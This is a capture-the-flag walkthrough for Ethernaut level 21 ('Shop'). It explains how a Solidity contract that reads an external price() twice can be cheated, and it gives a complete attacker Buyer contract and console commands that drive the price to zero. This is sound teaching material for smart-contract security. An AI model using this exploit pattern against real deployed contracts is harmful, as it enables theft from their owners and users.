# Level 21: Shop

This is the level 21 of OpenZeppelin [Ethernaut](https://ethernaut.openzeppelin.com/) web3/solidity based game.

## Pre-requisites

- Solidity [view functions](https://docs.soliditylang.org/en/v0.8.11/contracts.html#view-functions)

## Hack

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

`player` has to set `price` to less than it's current value.

The new value of `price` is fetched by calling `price()` method of a `Buyer` contract. Note that there are two distinct `price()` calls - in the `if` statement check and while setting new value of `price`. A `Buyer` can cheat by returning a legit value in `price()` method of `Buyer` during the first invocation (during `if` check) and returning any less value, say 0, during second invocation (while setting `price`).

But, we can't track the number of `price()` invocation in `Buyer` contract because `price()` must be a `view` function (as per the interface) - can't write to storage! However, look closely new `price` in `buy()` is set _after_ `isSold` is set to `true`. We can read the public `isSold` variable and return from `price()` of `Buyer` contract accordingly. Bingo!

Write the malicious `Buyer` in Remix:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
    function price() external view returns (uint);
}

contract Buyer {

    function price() external view returns (uint) {
        bool isSold = IShop(msg.sender).isSold();
        uint askedPrice = IShop(msg.sender).price();

        if (!isSold) {
            return askedPrice;
        }

        return 0;
    }

    function buyFromShop(address _shopAddr) public {
        IShop(_shopAddr).buy();
    }
}
```

Get the address of `Shop`:
```javascript
contract.address

// Output: <your-instance-address>
```

Now simply call `buyFromShop` of `Buyer` with `<your-instance-address>` as only param.

The `price` in `Shop` is now 0. Verify by:
```javascript
await contract.price().then(v => v.toString())

// Output: '0'
```

Free buy!


_Learned something awesome? Consider starring the [github repo](https://github.com/theNvN/ethernaut-openzeppelin-hacks)_ 😄

_and following me on twitter [here](https://twitter.com/heyNvN)_ 🙏
